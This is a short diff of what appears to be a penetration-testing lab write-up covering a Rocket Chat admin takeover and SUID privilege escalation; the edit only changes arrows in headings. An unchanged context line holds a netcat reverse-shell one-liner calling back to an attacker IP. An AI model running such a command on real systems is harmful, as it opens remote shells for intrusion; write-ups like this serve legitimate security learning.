@@ -16,7 +16,7 @@ PORT     STATE SERVICE
 3000/tcp open  ppp
 ```
 
-### Rocket Chat --> Admin Takeover
+### Rocket Chat -> Admin Takeover
 
 Port 3000 hosted an instance of Rocket Chat:
 
@@ -78,7 +78,7 @@ CMD:> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 192.168.45.184 21 >/tmp
 
 ## Privilege Escalation
 
-### SUID Binary --> MaiDag CVE
+### SUID Binary -> MaiDag CVE
 
 I searched for SUID binaries within the system, and found one that stood out:
 
